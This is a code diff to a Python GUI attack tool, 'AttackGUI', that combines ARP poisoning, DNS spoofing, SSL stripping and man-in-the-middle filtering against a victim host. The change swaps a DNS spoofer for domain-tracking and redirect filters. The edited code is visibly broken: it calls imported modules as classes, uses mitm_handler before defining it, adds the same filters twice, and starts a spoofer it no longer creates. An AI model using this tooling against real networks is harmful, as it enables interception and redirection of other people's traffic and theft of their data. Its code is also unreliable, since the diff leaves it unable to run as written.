@@ -3,8 +3,10 @@ from tkinter import scrolledtext, ttk
 from Arp_poisening import ARPPoisoner
 import uuid
 import threading
+import DNSDomainTracker
 import Dns_spoofing
 import scapy.all as sc
+import DomainRedirectFilter
 from mitm_handler import MitmHandler
 from SSLFilter import SSLStripFilter
 import subprocess
@@ -76,7 +78,6 @@ class AttackGUI:
         self.spoof_entry_dns = tk.Entry(self.dns_frame, width=23)
         self.spoof_entry_dns.grid(row=5, column=1, padx=5, pady=3)
         self.spoof_entry_dns.insert(0, self.get_attacker_mac())
-
 
 
         # MITM options
@@ -165,6 +166,9 @@ class AttackGUI:
 
         self.dns_spoof_ipv6_entry.delete(0, tk.END)
         self.dns_spoof_ipv6_entry.insert(0, ipv6)
+
+        self.attacker_ipv4 = ipv4
+        self.attacker_ipv6 = ipv6
 
     def get_gateway_ipv4(self):
         try:
@@ -283,27 +287,28 @@ class AttackGUI:
                     self.log("DNS spoofing error: missing required fields")
                     return
 
-                dns_map = {domain: spoof_ip}
-
                 self.log("Starting DNS spoofing:")
                 self.log(f"  Victim IP: {victim_ip}")
                 self.log(f"  Domain:    {domain}")
                 self.log(f"  IPv4:      {spoof_ip}")
                 self.log(f"  IPv6:      {spoof_ipv6 or 'disabled'}")
 
-                spoofer = Dns_spoofing.DNSSpoofer(
-                    interface=sc.conf.iface,
-                    victim_ip=victim_ip,
-                    dns_mapping=dns_map,
-                    attacker_ip=spoof_ip,
-                    attacker_ipv6=spoof_ipv6,
+                tracker = DNSDomainTracker(domain, self.log)
+                redirect = DomainRedirectFilter(
+                    tracker,
+                    spoof_ip=spoof_ip,
+                    spoof_ipv6=spoof_ipv6,
                     logger=self.log
                 )
+
+                mitm_handler.add_filter(tracker)   # learn DNS
+                mitm_handler.add_filter(redirect)
                 
                 arp_poisoner = ARPPoisoner(sc.conf.iface, victim_ip, server_ip, spoof_mac, self.log)
 
                 mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim_ip, spoof_mac, spoof_ip, spoof_ipv6, self.log)
-                mitm_handler.add_filter(spoofer._dns_filter)
+                mitm_handler.add_filter(tracker)
+                mitm_handler.add_filter(redirect)
                 mitm_handler.start()
                 spoofer.start()
                 arp_poisoner.start()
